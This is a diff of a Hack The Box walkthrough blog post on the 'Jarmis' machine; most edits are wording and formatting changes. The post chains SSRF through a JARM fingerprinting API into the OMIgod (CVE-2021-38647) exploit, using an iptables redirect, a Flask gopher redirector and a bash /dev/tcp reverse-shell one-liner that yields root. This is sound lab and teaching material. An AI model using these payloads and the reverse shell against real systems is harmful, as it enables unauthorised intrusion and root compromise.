@@ -1,11 +1,11 @@
 ---
 title: "Jarmis Walkthrough(HTB)"
-date: 2025-03-15
-draft: true 
+date: 2025-03-20
+draft: false 
 description: "Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell."
 tags: ["Hard", "Linux", "HTB", "hacking", "Web", "Walkthrough"]
 ---
-## Summary
+## About 
 Jarmis is a hard rated Linux machine. The port scan reveals SSH and web-server running on the box. The web-server is hosting an API service, which fetches the JARM signature of the queried server. This API service also labels the queried JARM signature as malicious if the corresponding entry is present in its database. We can then leverage this API service to exploit an SSRF vulnerability and determine the internal open ports of the remote host, which reveal the OMI (Open Management Infrastructure) service running on one of them. The OMI service is vulnerable to the OMIgod remote code execution vulnerability. OMIgod can be exploited by redirecting the API requests using a custom Flask server and making use of a Gopher URL, trigger an SSRF POST request to the remote server along with a reverse shell payload and obtain a root shell. 
 
 ## Reconnaissance & Enumeration
@@ -43,6 +43,8 @@ HOP RTT       ADDRESS
 - From loading and looking at the favicon itself I can tell that this a react page
 - The root page looks static, it's showing loading for a while now so I fired up ffuf for directory enumeration.
 - Quickly ffuf finds couple of endpoints
+![We-Got-something](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExa2JkNzJiNmM5czEyczA4eGhmeWx6dThsZnQ3b2R1YXR3ZnI1M3NlayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/ONmiNZnGPbrLWGYTEh/giphy.gif)
+
 ```
 ❯ ffuf -u http://10.10.11.117/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 60
 
@@ -76,9 +78,11 @@ static                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 2
 
 ```
 - `/docs` gets me to API documentation as I expected 
-- ![[Pasted image 20250314183340.png]]
+![Pasted image 20250314183340.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250314183340.png?raw=true)
 - Let's test each endpoint one by one. The first endpoint `api/v1/search/id/{jarm_id}` takes an integer as input so I provided a random number and got a signature back as json data in the response
-- **Endpoint-1**
+
+### Testing the endpoints
+**Endpoint-1**
 	- This is the curl command
 ```bash
 curl 'http://10.10.11.117/api/v1/search/id/3' -H 'accept: application/json' | jq
@@ -93,10 +97,10 @@ curl 'http://10.10.11.117/api/v1/search/id/3' -H 'accept: application/json' | jq
   "note": "reddit.com"
 }
 ```
-- **Endpoint-2**
+**Endpoint-2**
 	- Endpoint 2 is `api/v1/search/signature/?keyword=<SIG>&max_results=10` takes string value as input
-	- So when I input that signature from the endpoint-1 it gives results.
-```
+	- So when I input that signature from endpoint-1(Previous) it gives results.
+```bash
 curl 'http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d43d00041d2aa5ce6a70de7ba95aef77a77b00a0af&max_results=10' -H 'accept: application/json' | jq
 ```
 - Response:
@@ -149,14 +153,16 @@ curl 'http://10.10.11.117/api/v1/search/signature/?keyword=29d29d00029d29d00042d
 }
 
 ```
-- The results are odd anyway lets move to the next endpoint which should be the last one
-- **Endpoint-3**
+- The results are odd anyway lets move on to next endpoint which should be the last one in the list
+
+**Endpoint-3**
 	- This endpoint itself interesting as it ends in `/fetch` and takes a string as input. This is the full endpoint `/api/v1/fetch`
-- First I spawned a nc listener and requested vi a this endpoint
-```
+- Thi endpoint is promising so to test this I tried to hit back my host through this endpoint, First I spawned a nc listener and requested via this endpoint like this
+```bash
 curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001' -H 'accept: application/json'
 ```
-- The reflection on my server looks rather interesting cause...hmm...look at this
+- The reflection on nc my listener looks rather interesting cause, hmm...look at this
+![alien-lang](https://media1.tenor.com/m/2VCSbTAr25QAAAAC/nonsense-talk.gif)
 ```
 ❯ nc -lnvp 6001
 listening on [any] 6001 ...
@@ -169,12 +175,15 @@ connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 42834
 
 3&$ �����}L�)z/3��7�U�Ս�4�Q�xI���-+%
 ```
-- This looks like an encrypted value to me, it could be a certificate or handshake so I fired up a listener with ssl
-- Installed `ncat` with `sudo apt-get install ncat` the used this command to get a listener with ssl
+- This looks like an encrypted value to me, it could be a certificate or handshake but something encrypted that's for sure so I fired up a listener with ssl
+- Typical nc(NetCat) may give errors cause by default nc doesn't support SSL so I installed `ncat` with `sudo apt-get install ncat` then used this command to get a listener with ssl.
+
+{{< badge >}} definition {{< /badge >}}
+- "ncat" is a modern reimplementation of the venerable Netcat, developed by the Nmap Project, and is a flexible tool for reading, writing, redirecting, and encrypting data across a network, often used for security testing and administration tasks
 ```bash
 ncat --ssl -lnvp 443
 ```
-- Now the connection just cuts off after two seconds
+- Now the connection just cuts off after two seconds, Which is weird
 ```
 ❯ ncat --ssl -lnvp 443
 Ncat: Version 7.95 ( https://nmap.org/ncat )
@@ -195,9 +204,14 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unex
   "server": ""
 }
 ```
-- JARM (or JARM fingerprinting) is ==an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce== that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure
+### Understanding JARM
+- Before we move onto the next we have to learn about **JARM**
+
+{{< badge >}} Definition {{< /badge >}}
+- JARM (or JARM fingerprinting) is an active Transport Layer Security (TLS) server fingerprinting tool developed by Salesforce that helps identify and group servers based on their TLS configuration, potentially revealing malicious servers or malware command and control (C2) infrastructure
 - This [article](https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/) goes in-depth with JARM but the bottom line is, JARM works by **actively sending 10 TLS Client Hello packets to a target TLS server and capturing specific attributes of the TLS Server Hello responses**. The aggregated TLS server responses are then hashed in a specific way to produce the JARM fingerprint.
-- My guess here is the response signature that I got must be from the first request out of the ten intended ones because ncat allowed only one connection, I can change it allow multiple connections by including the `-k` flag.
+
+- My guess here is the response signature that I got must be from the first request out of the ten intended ones NetCat should've allowed only one connection, I can change it allow multiple connections by including the `-k` flag.
 - Now I actually got ten connections in the logs
 ```
 ❯ ncat --ssl -lnvkp 443
@@ -240,7 +254,7 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad 
   "note": "10.10.14.18"
 }
 ```
-- The response from single connection:
+- This is the response from single connection:
 ```
 ❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18' -H 'accept: application/json' | jq
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -254,13 +268,13 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad 
   "server": ""
 }
 ```
-- The response from the first to non-TLS listener:
+- This the response from the first(From normal NetCat) or non-TLS listener:
 ```
 ❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18%3A6001' -H 'accept: application/json' 
 {"sig":"00000000000000000000000000000000000000000000000000000000000000","endpoint":"10.10.14.18:6001","note":"10.10.14.18"}
 ```
 - We can see the differences clearly. Also in my recent response multiple fields are missing (i.e. `server`, `ismalicious`) 
-- My recent response is not in the database
+- As my recent response seemed weird I used the Endpoint-1 to check the signature and the response from the request shows that my recent response is not in the database
 ```
 ❯ curl 'http://10.10.11.117/api/v1/search/signature/?keyword=21d19d00021d21d21c42d43d0000007abc6200da92c2a1b69c0a56366cbe21&max_results=10' -H 'accept: application/json' | jq
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -270,8 +284,8 @@ Ncat: Failed SSL connection from 10.10.11.117: error:0A00006C:SSL routines::bad 
   "results": []
 }
 ```
-- We can see in the previous requests as it made from ncat it shows `note` value as `NCAT?` also `ismalicious=false` which is suspicious, as there could be fields with true value.
-- Thankfully we can identify this easily by iterating over all the values in the ID parameter. First let us narrow down the values 
+- We can see in the previous requests as it made from ncat it shows `note` value as `NCAT?` also `ismalicious=false` which is suspicious, as there could be fields with the value being true.
+- Thankfully we can identify this easily by iterating over all the values in the ID parameter(Endpoint-1). First let us narrow down the values 
 ```
 ❯ curl http://10.10.11.117/api/v1/search/id/400 
 null%                                                                                                                  
@@ -282,7 +296,7 @@ HTB/Machines/Jarmis
 ❯ curl http://10.10.11.117/api/v1/search/id/200 
 {"id":200,"sig":"29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e","ismalicious":false,"endpoint":"176.32.103.205:443","note":"amazon.com"}%  
 ```
-- So the values should be between 0 to 200 something. Now lets get the accurate value
+- So the values should be between 0 to 200 or in along those lines. Now lets get the accurate value
 ```
 HTB/Machines/Jarmis 
 ❯ curl http://10.10.11.117/api/v1/search/id/220
@@ -397,7 +411,7 @@ jq: parse error: Invalid numeric literal at line 1, column 7
   "server": ""
 }
 ```
-- There are 10 outputs,  metasploit looks interesting. Let's see what happens if listened from metasploit.
+- There are like 10 outputs,  metasploit looks interesting. Let's see what happens if listened from metasploit.
 - In metasploit select this module `auxillary/server/capture/http` and then set the port to 443, make SSL to true. Here is the oneliner
 ```bash
 sudo msfconsole -x "use auxiliary/server/capture/http; set srvport 443; set SSL true; run"
@@ -423,6 +437,7 @@ msf6 auxiliary(server/capture/http) >
 [*] Server started.
 [*] HTTP REQUEST 10.10.11.117 > 10.10.14.18:80 GET / Unknown   cookies=
 ```
+### Testing with SSRF
 - After a while, I tested the fetch endpoint for SSRF and there is SSRF to local host
 - I can determine the open ports within the internal network with this vulnerability. The responses differ between open and closed, For an example
 - **Open Port:**
@@ -463,8 +478,8 @@ msf6 auxiliary(server/capture/http) >
   "note": "localhost"
 }
 ```
-- As you can see if the port is open it included `127.0.0.1` in the response else it gives the value `null`
-- To automate this I could use bash script but it would be slower
+- As you can see if the port is open it includes `127.0.0.1` in the response else it gives the value `null`
+{{< alert >}}  To automate this I could use bash script but it would be slower, So **choosing the script below is not recommended** {{< /alert >}}
 ```bash
 #!/bin/bash
 
@@ -502,7 +517,7 @@ ffuf -u 'http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ' -w <(seq
 55394                   [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 332ms]
 ```
 - Port `5986` and `5985` seems interesting particularly because in windows those ports are used by WinRM. 
-- In the ffuf scan I didn't get port `5985` but I tested it manually. It took 20 seconds to respond may be that's why ffuf marked it as closed but anyway this port seems interesting.
+- In the ffuf scan I didn't get port `5985` but I tested it manually. It took me 20 seconds to respond may be that's why ffuf marked it as closed but anyway this port seems interesting.
 ```
 ❯ curl 'http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:5985' -H 'accept: application/json' | jq
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -514,18 +529,22 @@ ffuf -u 'http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ' -w <(seq
   "note": "localhost"
 }
 ```
+![it-starts](https://media1.tenor.com/m/oGkf9b9L9FsAAAAC/cbb2-cbbus2.gif)
 ## Exploitation
+
+### CVE-2021-38647
 - The port 5985 has Microsoft Open Management Infrastructure running we can exploit this service using [CVE-2021-38647](https://nvd.nist.gov/vuln/detail/CVE-2021-38647) and there is also a [POC](https://github.com/horizon3ai/CVE-2021-38647) for this. But the POC just sends POST request to 5985 (Without TLS) or to 5986 (TLS included)
-- Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to exploit OMIGod(CVE-2021-38647).
+- Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to use the exploit OMIGod(CVE-2021-38647).
 - To achieve this we need to modify the Ip tables rules as proxy chains doesn't support this level of precision
-- Lets flush all the previous rules
+- Lets flush all the previous rules in the IP tables
 ```bash
 sudo iptables -t nat -F
 ```
-- Then add the rule to redirect the 11th request from `443` to port `8443`
+- Then add this rule to redirect the 11th request from `443` to port `8443`
 ```bash
 sudo iptables -I PREROUTING -t nat -p tcp --dport 443 -m statistic --mode nth --every 11 --packet 10 -j REDIRECT --to-port 8443
 ```
+#### Preparing the stage
 - To test this lets open two listeners, one on port `443` other on `8443`
 ```bash
 ncat --ssl -lnvp 443
@@ -565,7 +584,7 @@ Connection: keep-alive
 
 NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1)
 ```
-- We can exploit this using Gopher protocol. I have used this protocol before when doing ![[5.8-Travel]] box, basically this protocol uses no headers thus perfect for delivering payloads
+- Now we can exploit this using Gopher protocol. I have used this protocol before when doing Travel box, basically this protocol uses no headers thus perfect for delivering payloads
 - I copied the payload data from the [POC](https://raw.githubusercontent.com/horizon3ai/CVE-2021-38647/refs/heads/main/omigod.py) and after  that I added curly braces replacing previous command data then included it into this python code. 
 ```python
 from flask import Flask, redirect
@@ -625,6 +644,7 @@ if __name__ == "__main__":
 echo 'bash -c "exec bash -i &>/dev/tcp/10.10.14.18/6001 <&1"' | base64
 ```
 - Basically this python code will listen on 8443 and Upon receiving sends the request to target's port 5985 with including malicious payload as data. Then the malicious payload will run the reverse shell.
+
 ### Performing the attack
 - Starting the python program
 ```bash
@@ -639,6 +659,7 @@ ncat --ssl -lnvp 443
 nc -lvnp 6001
 ```
 - As we already made the IP rule to redirect the 11th request from port `443` to port `8443`. Now lets start the attack by using `fetch` endpoint pointing to our listener on port `443`.
+
 ```
 ❯ curl 'http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18' | jq .
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -671,7 +692,7 @@ WARNING: This is a development server. Do not use it in a production deployment.
 Press CTRL+C to quit
 10.10.11.117 - - [14/Mar/2025 23:55:13] "GET / HTTP/1.1" 301 -
 ```
-- Got the reverse shell connection and secured both the User flag and Root flag
+- Got the reverse shell connection and secured both the {{< keyword >}} User flag {{< /keyword >}} & {{< keyword >}} Root flag {{< /keyword >}}
 ```
 ❯ nc -lvnp 6001
 
@@ -692,4 +713,7 @@ cat /home/htb/user.txt
 e2848e17<redacted>
 root@Jarmis:/root# 
 ```
+{{< typeit >}} I hope you enjoyed my walkthrough, It took me lot of time to contruct everything, With that being said I hope that you would share this to your connections. But I have to mention this, if it weren't for 0xdf this writeup wouldn't possible. Thank you for reading my article, Hey! I really meant that Thank you.. See you soon on another
+{{< /typeit >}}
 
+![bye](https://media1.tenor.com/m/cTQhkMn8dLgAAAAC/car-bye.gif)
